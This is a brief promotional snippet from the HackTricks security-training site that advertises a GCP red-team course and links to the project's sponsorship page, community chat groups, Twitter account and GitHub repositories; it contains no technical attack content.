Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
